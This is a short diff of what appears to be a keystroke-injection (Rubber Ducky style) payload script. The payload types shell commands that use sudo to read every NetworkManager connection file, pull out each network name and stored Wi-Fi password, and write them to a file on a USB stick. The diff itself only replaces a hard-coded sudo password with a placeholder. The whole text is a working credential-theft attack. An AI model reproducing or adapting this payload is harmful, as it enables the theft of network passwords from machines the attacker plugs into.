@@ -4,9 +4,9 @@ STRING echo -e "Wireless_Network_Name Password\n--------------------- --------" 
 ENTER
 STRING for FILE in /etc/NetworkManager/system-connections/*;
 ENTER
-STRING echo password | sudo -S echo  
+STRING echo PASSWORD | sudo -S echo  
 ENTER
-STRING do echo -e "$(sudo <<< password cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< password cat "$FILE" | grep -oP '(?<=psk=).*')"
+STRING do echo -e "$(sudo <<< PASSWORD cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< PASSWORD cat "$FILE" | grep -oP '(?<=psk=).*')"
 ENTER
 STRING done >> /media/$(hostname)/UsbStick/wifi_pass.txt
 ENTER
